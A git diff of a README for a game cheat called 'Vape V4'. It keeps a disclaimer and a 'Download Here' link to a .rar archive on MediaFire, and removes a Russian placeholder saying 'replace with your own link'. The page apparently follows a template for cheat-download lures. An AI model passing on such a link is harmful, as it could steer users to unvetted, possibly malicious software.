@@ -14,4 +14,4 @@
 ## ⚠️ Disclaimer
 This project is for educational purposes only. Using cheats on servers may result in bans. Use at your own risk.
 ## 📩 Download
-🔹 [[Download Here](https://www.mediafire.com/file/cir7ldeviwn6eec/Vape+V4.rar/file)](#) *(замени на свою ссылку)*
+🔹 [[Download Here](https://www.mediafire.com/file/cir7ldeviwn6eec/Vape+V4.rar/file)](#) 
